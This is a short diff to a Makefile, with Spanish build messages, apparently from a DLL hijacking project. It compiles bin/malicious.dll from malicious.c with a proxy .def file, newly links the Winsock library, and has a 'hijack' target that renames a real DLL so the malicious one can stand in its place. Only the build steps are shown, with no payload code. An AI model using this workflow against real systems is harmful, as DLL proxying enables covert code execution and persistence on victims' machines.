@@ -16,7 +16,7 @@ linux: bin/malicious.dll
 bin/malicious.dll: malicious.c
 	@echo "Compilando DLL..."
 	@mkdir -p bin
-	x86_64-w64-mingw32-gcc -shared -o bin/malicious.dll malicious.c proxy.def -s
+	x86_64-w64-mingw32-gcc -shared -o bin/malicious.dll malicious.c proxy.def -lws2_32 -s
 
 hijack:
 	mv bin/real.dll bin/og_real.dll
